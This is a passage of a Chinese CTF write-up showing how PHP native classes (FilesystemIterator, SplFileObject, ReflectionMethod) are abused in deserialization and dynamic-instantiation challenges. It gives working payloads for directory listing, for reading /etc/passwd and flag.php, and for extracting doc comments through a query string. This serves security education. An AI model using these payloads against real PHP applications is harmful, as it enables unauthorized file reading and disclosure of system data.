# payload一句话的形式:
$a = new FilesystemIterator("/*");foreach($a as $f){echo($f->__toString().'<br>');}
```

前面都是读取文件目录，下面是可以读取文件内容

###  可读取文件类

####  SplFileObject 类

[官方文档](https://www.php.net/manual/zh/class.splfileobject.php)

SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作

测试：

读取文件的一行

```php
<?php
$context = new SplFileObject('/etc/passwd');
echo $context;
```

对文件中的每一行内容进行遍历

```php
<?php
$context = new SplFileObject('/etc/passwd');
foreach($context as $f){
    echo($f);
}
```



### [2021 MAR DASCTF 明御攻防赛]ez_serialize

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

class A{
    public $class;
    public $para;
    public $check;
    public function __construct()
    {
        $this->class = "B";
        $this->para = "ctfer";
        echo new  $this->class ($this->para);
    }
    public function __wakeup()    // 可以直接绕过__wakeup()方法的执行
    {
        $this->check = new C;
        if($this->check->vaild($this->para) && $this->check->vaild($this->class)) {
            echo new  $this->class ($this->para);
        }
        else
            die('bad hacker~');
    }

}
class B{
    var $a;
    public function __construct($a)
    {
        $this->a = $a;
        echo ("hello ".$this->a);
    }
}
class C{

    function vaild($code){
        $pattern = '/[!|@|#|$|%|^|&|*|=|\'|"|:|;|?]/i';
        if (preg_match($pattern, $code)){
            return false;
        }
        else
            return true;
    }
}


if(isset($_GET['pop'])){
    unserialize($_GET['pop']);
}
else{
    $a=new A;

}
```

还是一样的，先代码审计，发现没有什么危险函数的利用，我们可以利用原生类来利用了

首先利用DirectoryIterator或FilesystemIterator类去遍历目标的Web目录：

```php
<?php
class A{
    public $class='FilesystemIterator';    
    // FilesystemIterator("/var/www/html")
    public $para="/var/www/html/";
    public $check;
    }

$poc  = new A();
echo urlencode(serialize($poc));
```

执行后得到一个文件夹 aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE：

然后进入这个文件夹

poc

```php
<?php
class A{
    public $class='FilesystemIterator';    
    // FilesystemIterator("/var/www/html")
    public $para="/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/";
    public $check;
    }

$poc  = new A();
echo urlencode(serialize($poc));
```

看到flag.php

现在我们只需要读取文件内容，利用` SplFileObject类`

payload

```php
<?php
class A{
    public $class='SplFileObject';    
    // SplFileObject("/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php")
    public $para="/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php";
    public $check;
    }

$poc  = new A();
echo serialize($poc);
```

能否利用原生类读取文件内容和文件目录？

```
echo new  $this->class ($this->para)
```

这行代码比较关键，就是能否利用原生类的关键

## 使用 ReflectionMethod 类获取类方法的相关信息

###  ReflectionMethod

**ReflectionMethod** 类报告了一个方法的有关信息。可以在 PHP 运行状态中，扩展分析 PHP 程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API

```php
class ReflectionMethod extends ReflectionFunctionAbstract implements Reflector {	
/*方法*/
    ReflectionMethod::__construct — ReflectionMethod 的构造函数
    ReflectionMethod::export — 输出一个回调方法
    ReflectionMethod::getClosure — 返回一个动态建立的方法调用接口，译者注：可以使用这个返回值直接调用非公开方法。
    ReflectionMethod::getDeclaringClass — 获取被反射的方法所在类的反射实例
    ReflectionMethod::getModifiers — 获取方法的修饰符
    ReflectionMethod::getPrototype — 返回方法原型 (如果存在)
    ReflectionMethod::invoke — Invoke
    ReflectionMethod::invokeArgs — 带参数执行
    ReflectionMethod::isAbstract — 判断方法是否是抽象方法
    ReflectionMethod::isConstructor — 判断方法是否是构造方法
    ReflectionMethod::isDestructor — 判断方法是否是析构方法
    ReflectionMethod::isFinal — 判断方法是否定义 final
    ReflectionMethod::isPrivate — 判断方法是否是私有方法
    ReflectionMethod::isProtected — 判断方法是否是保护方法 (protected)
    ReflectionMethod::isPublic — 判断方法是否是公开方法
    ReflectionMethod::isStatic — 判断方法是否是静态方法
    ReflectionMethod::setAccessible — 设置方法是否访问
    ReflectionMethod::__toString — 返回反射方法对象的字符串表达
        
/*继承的方法*/
    final private ReflectionFunctionAbstract::__clone(): void
    public ReflectionFunctionAbstract::getAttributes(?string $name = null, int $flags = 0): array
    public ReflectionFunctionAbstract::getClosureScopeClass(): ?ReflectionClass
    public ReflectionFunctionAbstract::getClosureThis(): object
    public ReflectionFunctionAbstract::getDocComment(): string
    public ReflectionFunctionAbstract::getEndLine(): int
    public ReflectionFunctionAbstract::getExtension(): ReflectionExtension
    public ReflectionFunctionAbstract::getExtensionName(): string
    public ReflectionFunctionAbstract::getFileName(): string
    public ReflectionFunctionAbstract::getName(): string
    public ReflectionFunctionAbstract::getNamespaceName(): string
    public ReflectionFunctionAbstract::getNumberOfParameters(): int
    public ReflectionFunctionAbstract::getNumberOfRequiredParameters(): int
    public ReflectionFunctionAbstract::getParameters(): array
    public ReflectionFunctionAbstract::getReturnType(): ?ReflectionType
    public ReflectionFunctionAbstract::getShortName(): string
    public ReflectionFunctionAbstract::getStartLine(): int
    public ReflectionFunctionAbstract::getStaticVariables(): array
    public ReflectionFunctionAbstract::hasReturnType(): bool
    public ReflectionFunctionAbstract::inNamespace(): bool
    public ReflectionFunctionAbstract::isClosure(): bool
    public ReflectionFunctionAbstract::isDeprecated(): bool
    public ReflectionFunctionAbstract::isGenerator(): bool
    public ReflectionFunctionAbstract::isInternal(): bool
    public ReflectionFunctionAbstract::isUserDefined(): bool
    public ReflectionFunctionAbstract::isVariadic(): bool
    public ReflectionFunctionAbstract::returnsReference(): bool
    abstract public ReflectionFunctionAbstract::__toString(): void
```

ReflectionMethod 类中有很多继承方法可以使用，比如这个 `getDocComment()` 方法，我们可以用它来获取类中各个函数注释内容，如下图所示（借用下图）



![image-20210516101052113](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210516101233.png)

###  [2021 CISCN]easy_source

先看代码

```php
<?php
class User
{
    private static $c = 0;

    function a()
    {
        return ++self::$c;
    }

    function b()
    {
        return ++self::$c;
    }

    function c()
    {
        return ++self::$c;
    }

    function d()
    {
        return ++self::$c;
    }

    function e()
    {
        return ++self::$c;
    }

    function f()
    {
        return ++self::$c;
    }

    function g()
    {
        return ++self::$c;
    }

    function h()
    {
        return ++self::$c;
    }

    function i()
    {
        return ++self::$c;
    }

    function j()
    {
        return ++self::$c;
    }

    function k()
    {
        return ++self::$c;
    }

    function l()
    {
        return ++self::$c;
    }

    function m()
    {
        return ++self::$c;
    }

    function n()
    {
        return ++self::$c;
    }

    function o()
    {
        return ++self::$c;
    }

    function p()
    {
        return ++self::$c;
    }

    function q()
    {
        return ++self::$c;
    }

    function r()
    {
        return ++self::$c;
    }

    function s()
    {
        return ++self::$c;
    }

    function t()
    {
        return ++self::$c;
    }
    
}

$rc=$_GET["rc"];    // 传入原生类名
$rb=$_GET["rb"];    // 传入类属性
$ra=$_GET["ra"];    // 传入类属性
$rd=$_GET["rd"];    // 传入类方法
$method= new $rc($ra, $rb);    // 实例化刚才传入的原生类
var_dump($method->$rd());     // 调用类中的方法
```

首先看到这两行代码

```php
$method= new $rc($ra, $rb);  
var_dump($method->$rd());
```

类似于上面的题，需要利用原生类

这个题，我开始想到还是用`FilesystemIterator`

如果得到文件路径，然后还是用`SplFileObject`来读取文件内容

但是这个考`ReflectionMethod`

猜测flag在注释中

直接构造payload,即可得到flag

```php
?rc=ReflectionMethod&ra=User&rb=a&rd=getDocComment
```

